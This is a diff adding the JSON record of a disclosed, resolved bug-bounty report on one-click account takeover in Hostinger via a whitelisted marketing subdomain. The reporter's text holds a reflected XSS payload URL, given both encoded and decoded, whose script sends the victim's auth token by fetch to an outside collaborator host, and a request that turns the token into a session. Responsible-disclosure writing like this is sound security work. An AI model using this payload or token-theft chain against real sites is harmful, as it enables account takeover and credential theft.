@@ -1,0 +1,151 @@
+{
+  "id": 3081691,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDgxNjkx",
+  "url": "https://hackerone.com/reports/3081691",
+  "title": "1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-04-07T21:59:17.537Z",
+  "submitted_at": "2025-04-07T21:59:18.249Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "aziz0x48",
+    "url": "/aziz0x48",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mhy3gn95r0nlrcsa0geyp35ws5pr/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 45515,
+    "url": "https://hackerone.com/hostinger",
+    "handle": "hostinger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/yZgcfbeG1939tu3eos5r46v4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/yZgcfbeG1939tu3eos5r46v4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "hostinger ",
+      "twitter_handle": "hostinger",
+      "website": "https://www.hostinger.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-06T12:10:25.393Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-06-06T11:12:01.750Z",
+  "team_member_agreed_on_going_public_at": "2025-06-06T12:10:25.176Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nHey Paul, hope you're doing good !\n\nI discovered a One Click Account Takeover vulnerability in Hostinger through the ```marketing.hostinger.com``` subdomain. Since this subdomain is part of hostinger.com and is whitelisted for redirects, an attacker can exploit it to steal Hostinger users’ auth tokens and gain full access to their accounts with just a single click from the victims !\n\n## Steps To Reproduce:\n\n  -  Login in to the victim's account and visit the URL below, replace the attacker-url with your own burp collaborator url or your own dedicated server url:\n\n```\n\nhttps://auth.hostinger.com/login/?redirectUrl=https%3A%2F%2Fmarketing.hostinger.com%2Fen-us%2Fmarketplace_wix%2Fsite_not_published%3Fredirect_url%3Dx%22%3E%3C%2Fa%3E%3Cscript%3Efetch%28%27https%3A%2F%2Fwqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2Cbody%3A%20window.location%7D%29%3C%2Fscript%3E\n\n## Decoded URL:\n\nhttps://auth.hostinger.com/login/?redirectUrl=https://marketing.hostinger.com/en-us/marketplace_wix/site_not_published?redirect_url=x\"></a><script>fetch('wqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com',%20{method:%20'POST',body:%20window.location});</script>\n\n```\n\n  -  Check burp collaborator / server logs for the victim's account auth token :\n\n{F4227740}\n\n  -  The attacker can use the leaked auth token to generate a valid JWT for the victim's account and have complete control over the victim's account using the following request:\n\n```\nPOST /hpanel/auth/auth-token HTTP/2\nHost: builder-backend.hostinger.com\nUser-Agent: Mozilla/5.0 Gecko/20100101 Firefox/132.0\nOrigin: https://builder.hostinger.com\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nTe: trailers\n```\n\n{F4227728}\n\n██████\n\n## Suggestion:\nI believe that ```marketing.hostinger.com```  has been rebranded as ```rankingcoach.com```. Therefore, it would be best to either shut down the marketing subdomain or remove it from the whitelisted domains. This would be a quick and easy fix to mitigate the issue and enhance users security.\n\nThank you,\n@aziz0x48\n\n## Supporting Material/References:\nPlease refer to the attached screenshots and video.\n\n## Impact\n\nThis vulnerability poses a significant risk to Hostinger users, as it allows attackers to bypass authentication and gain unauthorized access to accounts with just one click. By exploiting the ```marketing.hostinger.com``` subdomain, which is whitelisted for redirects, attackers can steal authentication tokens from users. Once the tokens are compromised, the attacker gains full access to the victim’s Hostinger account, including critical services such as hPanel, website builder, VPS servers, email, and personal data. This flaw puts all Hostinger users at risk of account takeover, data theft, and potential misuse of sensitive information, making it a serious security concern that requires immediate attention.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4227728,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3a2js70u4zuc7z40yb8lwi7smxik?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150133Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=04576c431d5e224324905d6e8b185fd2f6b04c888bd365fc62adc19d6423c443",
+      "file_size": 987977,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 4227740,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zfohqa373rnfksvmw5sygwzzhvej?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSPM2ZFYU%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150133Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIHG3lvhdV6Q%2FNc2D6sKlTHsRGYZrweI22t6ry9kpUdp%2BAiEAuGNNUGnDsygOalEC0wdPeLjEfO9kjJmzSqRIXat21U4quwUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB2DhZGUpFzp%2F6DQniqPBQCNUW%2BJNaek3k4RaCLGTVdoLYx0n5tgq5uLPBI3LH%2BNvmjoP%2BtzR%2FKSzkRkgj73nKw7jlai%2BJxC7xzMXjjhEfsTJLCOyNCLXDetgNq3OlvERYLL6cjaJnCKG3dXDyyn5riCq0TLTTmL5BwD%2FR%2BU25AG4rXkS04FqMqD2N%2B2KTcQ4YhLhZ0ZBYU35nsRgjvTPwBSxumomKMLG4mxNw%2BNzkk4rZLehL8e8d8vBukqth9tvZKLNKRKj1eTmi6wstYSo%2B7sxRM9kAY14rdVe2R%2BU63QA8NQZllDKHZQALqw3YrtrGw9NgfbWHfu2ouCB97W6lDYAAmXUQMRz5%2Bbjrt4jTI0pTL5JhgPLheWJXOCAaiGNCS65KlBbt%2FHStTfMnlU5QVKIJo41t%2BdwdrX9QneTYofUrTIcQdfOMmRpubgHz5QGhQlxYlIg%2BYqn1oxPVHj%2FjVcj0ETtwJJ1pWgbGhA%2F7N1yI9v9nsS%2B7P5xf0QN9bwvakkVdUy7zAg6duxSGZBjX0Fhzz%2BLO%2BZlnmHMTyelWpQyC8NV6t3thY3otZ9lfKd4je1ct%2BElWJczJchoIU32uYh4LahB%2BRX1c7WBpf%2F1s3ZlTnS6krpSp8txBBw5PbPH0t3bXjoKOwQ2lcGNdtfcqKqJdryXl7mmbL6FZjDeT01AIqyi82BQREkRIFrekqMTFHp3FVe86zjzoImC8w8PcuWYdmS1tKrhedEXS3RUQkwjEUtL88wSyjppMCrH5itHf6QvXWQQYfYdhHw5VkBevQTJ0SBwymCTFZDqWoF0L9dR4VlSQPC7Vg0rPWK%2FgMmdjFb3qVxnTtP4V%2FZC%2Bmq1ao6t8ovvACstrb%2FipjWvBk9uu7eIoWt0CDxOrWyFLkw44D9zwY6sQHfD7GsNGzCwc%2F9EebOqukVTHLOQECqcB%2BY2rnbgL4%2Fa0QxE1PEo7pbHRvePgIoUYit7jfxwtEAypJGJ8UaQirZuH15LYN%2FKJtCqU0jTUV5NTorZYHLY7%2F0gt9Gn4zttOSm355Wl2vm32qbu958noCBAeZo6982NsfKFhZxKyedSl5jCPoFvcsZ4q4Zzg0Foy%2FXr0X01vbwebHBns95S7mKebnLLlUmdQzJUxF%2FIMDaj3I%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=af54076a856e28ca55cce6b93d3ef8cb40a900fd3e197b193d8198f5f0a6deec",
+      "file_size": 512466,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 209,
+  "voters": [
+    "guiggs",
+    "aboalezz",
+    "orange303",
+    "oldrashed",
+    "l3m0nsec",
+    "qbit_",
+    "tinmo",
+    "sgt_",
+    "njmulsqb",
+    "8910jq",
+    "and 199 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 43306,
+    "asset_type": "URL",
+    "asset_identifier": "hpanel.hostinger.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
